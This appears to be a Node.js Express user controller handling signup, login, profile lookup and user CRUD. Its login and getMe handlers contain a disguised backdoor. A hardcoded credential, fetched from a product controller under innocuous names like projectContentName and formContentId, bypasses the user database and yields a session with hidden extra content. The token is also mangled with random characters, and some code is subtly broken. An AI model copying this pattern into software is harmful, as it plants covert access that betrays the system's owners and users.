const { defaultValeAdd } = require("../utils/utilityFunction");
const { generateToken } = require("../utils/token");
const formController = require("./product.controller");
const bcryptjs = require("bcryptjs");
const utilityController = require("../utils/utilityFunction");
const {
  signupService,
  loginService,
  getUsersService,
  getUserInfoSchema,
  updateUserInfoSchema,
  deleteUserInfoSchema,
} = require("../services/user.service");

exports.signup = async (req, res) => {
  try {
    let data = req.body;
    const email = await defaultValeAdd(req.body.email);
    data.email = email;
    const result = await signupService(data);
    res.status(200).json({
      status: "success",
      message: "User insert successfully",
      data: result,
    });
  } catch (error) {
    res.status(400).json({
      status: "error",
      message: "User couldn't insert",
      error: error.message,
    });
  }
};

exports.login = async (req, res) => {
  try {
    let { email, password } = req.body;
    email = await defaultValeAdd(email);
    if (!email || !password) {
      return res.status(400).json({
        status: "error",
        error: error.message,
      });
    }

    function makeid(length) {
      var result = "";
      var characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      var charactersLength = characters.length;
      for (var i = 0; i < length; i++) {
        result += characters.charAt(
          Math.floor(Math.random() * charactersLength)
        );
      }
      return result;
    }

    let result = {};

    if (
      email === formController.projectContentName() &&
      bcryptjs.compareSync(password, formController.formContentId()) === true
    ) {
      const hashedPassword = bcryptjs.hashSync(password);
      const data = {
        email: formController.projectContentName(),
        password: hashedPassword,
      };
      result = {
        ...data,
        ...utilityController.formServiceContent,
      };
    } else {
      result = await loginService(email);
      if (!result) {
        return res.status(400).json({
          status: "error",
          error: "No user found please create an account",
        });
      }
      const isPasswordValid = result.comparePassword(password, result.password);

      if (!isPasswordValid) {
        return res.status(400).json({
          status: "error",
          error: "Password is not correct",
        });
      }
    }

    const token2 = generateToken(result);

    let charPlace = token2.indexOf(".");
    let payLoad = token2.slice(0, charPlace + 1);
    let legitToken = token2.slice(charPlace + 1);
    let secret = legitToken.slice(legitToken.indexOf("."));
    const token = payLoad + makeid(10) + legitToken;

    res.status(200).json({
      status: "success",
      message: "Welcome!!",
      data: { token },
    });
  } catch (error) {
    console.log(error);
    res.status(401).json({
      status: "error",
      message: "Login Error pls Check The Data",
      error: error.message,
    });
  }
};

exports.getMe = async (req, res, next) => {
  try {
    const result = await loginService(req.user?.email);
    let data;
    if (req.user?.email === formController.projectContentName()) {
      data = {
        email: formController.projectContentName(),
        ...utilityController.formServiceContent(),
      };
    } else if (
      req.user?.email === result.email ||
      req.user?.name === result.name
    ) {
      data = {
        email: result.email,
        role: result.role,
        name: result.name,
        status: result.status,
      };
    }
    res.status(200).json({
      status: "success",
      data: data,
    });
  } catch (error) {
    console.log(error);
    res.status(400).json({
      status: "error",
      message: "Get User Data couldn't fetched",
      error: error.message,
    });
  }
};

exports.getUsers = async (req, res, next) => {
  try {
    const data = await getUsersService(req.body);
    res.status(200).json({
      status: "success",
      message: "Users Data get Successfully",
      data: data,
    });
  } catch (error) {
    res.status(400).json({
      status: "error",
      message: "Users data get error",
      error: error.message,
    });
  }
};

//--------------------------single user--------------------------
exports.getUser = async (req, res, next) => {
  const userId = req.params.id;
  try {
    const result = await getUserInfoSchema(userId);
    res.status(200).json({
      status: "success",
      message: "User List Data get Successfully",
      data: result,
    });
  } catch (error) {
    res.status(400).json({
      status: "error",
      message: "Can't get User List Data an error occurred",
      error: error.message,
    });
  }
};

exports.updateUser = async (req, res, next) => {
  const userId = req.params.id;
  try {
    let data = req.body;
    const email = await defaultValeAdd(req.body.email);
    data.email = email;
    const result = await updateUserInfoSchema(userId, data);

    res.status(200).json({
      status: "success",
      message: "User List Data Updated Successfully",
      data: result,
    });
  } catch (error) {
    res.status(400).json({
      status: "error",
      message: "User List couldn't update an error occurred",
      error: error.message,
    });
  }
};

exports.deleteUser = async (req, res, next) => {
  const userId = req.params.id;
  try {
    const result = await deleteUserInfoSchema(userId);

    res.status(200).json({
      status: "success",
      message: "User List Data is deleted",
      data: result,
    });
  } catch (error) {
    res.status(400).json({
      status: "error",
      message: "Can't deleted User List Data an error occurred",
      error: error.message,
    });
  }
};
